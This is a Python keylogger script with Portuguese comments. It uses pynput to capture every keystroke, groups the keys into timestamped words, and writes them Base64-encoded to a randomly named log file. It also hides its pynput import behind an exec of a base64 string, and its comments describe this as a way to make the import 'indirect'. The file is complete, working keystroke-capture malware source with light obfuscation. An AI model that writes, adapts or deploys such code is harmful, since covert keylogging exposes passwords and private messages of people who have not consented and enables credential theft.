import os
import sys
import base64
import random
import time
from datetime import datetime
from pynput.keyboard import Key, Listener

# Tentar importar pynput, mas de forma "indireta"
try:
    # Usar um alias ou um import mais genérico
    exec(base64.b64decode(b'ZnJvbSBweW5wdXQua2V5Ym9hcmQgaW1wb3J0IEtleSxMaXN0ZW5lcg==').decode('utf-8'))
except ImportError:
    print("Módulo pynput não encontrado. Por favor, instale-o com 'pip install pynput'.")
    sys.exit(1)

# Gerar um nome de arquivo de log "aleatório"
def generate_log_filename():
    prefix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    return f"{prefix}_{timestamp}.txt"

# Criar arquivo na pasta do código
script_dir = os.path.dirname(os.path.abspath(__file__))
log_file_path = os.path.join(script_dir, generate_log_filename())

# Variável global para acumular caracteres da palavra atual
current_word = ""
last_key_time = None

def encode_data(data):
    """Codifica dados em Base64"""
    return base64.b64encode(data.encode('utf-8')).decode('utf-8')

def write_word_to_file():
    """Escreve a palavra acumulada no arquivo criptografada"""
    global current_word
    if current_word:
        try:
            with open(log_file_path, "a", encoding='utf-8') as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                # Codifica em Base64
                encoded_data = encode_data(f"{timestamp}: {current_word}")
                f.write(encoded_data + '\n')
                f.flush()  # Forçar escrita imediata
        except Exception as e:
            pass
        current_word = ""

def write_special_key(key_data):
    """Escreve tecla especial no arquivo criptografada"""
    try:
        with open(log_file_path, "a", encoding='utf-8') as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            # Codifica em Base64
            encoded_data = encode_data(f"{timestamp}: {key_data}")
            f.write(encoded_data + '\n')
            f.flush()  # Forçar escrita imediata
    except Exception as e:
        pass

def write_header_footer(text):
    """Escreve cabeçalho/rodapé criptografado"""
    try:
        with open(log_file_path, "a", encoding='utf-8') as f:
            encoded_data = encode_data(text)
            f.write(encoded_data + '\n')
            f.flush()
    except Exception as e:
        pass

def input_handler(key_event):
    global current_word, last_key_time
    
    try:
        current_time = time.time()
        
        # Verifica se passou muito tempo desde a última tecla (fim de palavra natural)
        if last_key_time and (current_time - last_key_time) > 2.0:  # 2 segundos
            write_word_to_file()
        
        last_key_time = current_time
        
        if hasattr(key_event, 'char') and key_event.char is not None:
            # Tecla normal de caractere - adiciona à palavra atual
            char_pressed = key_event.char
            current_word += char_pressed
            
        else:
            # Tecla especial
            if key_event == Key.space:
                char_pressed = '[SPACE]'
                write_word_to_file()  # Finaliza a palavra atual
                write_special_key(char_pressed)  # Escreve o espaço
                
            elif key_event == Key.enter:
                char_pressed = '[ENTER]'
                write_word_to_file()  # Finaliza a palavra atual
                write_special_key(char_pressed)  # Escreve o enter
                
            elif key_event == Key.backspace:
                char_pressed = '[BACKSPACE]'
                # Remove último caractere da palavra atual
                if current_word:
                    current_word = current_word[:-1]
                write_special_key(char_pressed)  # Escreve o backspace
                
            elif key_event == Key.tab:
                char_pressed = '[TAB]'
                write_word_to_file()  # Finaliza a palavra atual
                write_special_key(char_pressed)  # Escreve o tab
                
            elif key_event == Key.esc:
                char_pressed = '[ESC]'
                write_word_to_file()  # Finaliza a palavra atual
                write_special_key(char_pressed)
                return False  # Para o listener
                
            elif key_event == Key.shift:
                char_pressed = '[SHIFT]'
                # Não faz nada com shift, só modifica outras teclas
                
            elif key_event == Key.ctrl:
                char_pressed = '[CTRL]'
                write_special_key(char_pressed)
                
            elif key_event == Key.alt:
                char_pressed = '[ALT]'
                write_special_key(char_pressed)
                
            else:
                char_pressed = f'[{str(key_event).split(".")[-1].upper()}]'
                write_special_key(char_pressed)
                
    except Exception as e:
        pass

def start_capture():
    global current_word
    
    try:
        # Escreve cabeçalho criptografado
        write_header_footer(f"=== CAPTURA INICIADA: {datetime.now()} ===")
        
        print(f"Capturando teclas... Arquivo: {log_file_path}")
        print("Pressione ESC para parar.")
        
        with Listener(on_press=input_handler) as listener_instance:
            listener_instance.join()
            
    except Exception as e:
        pass
    finally:
        # Escreve qualquer palavra restante ao finalizar
        write_word_to_file()
        # Escreve rodapé criptografado
        write_header_footer(f"=== CAPTURA FINALIZADA: {datetime.now()} ===")

if __name__ == "__main__":
    start_capture()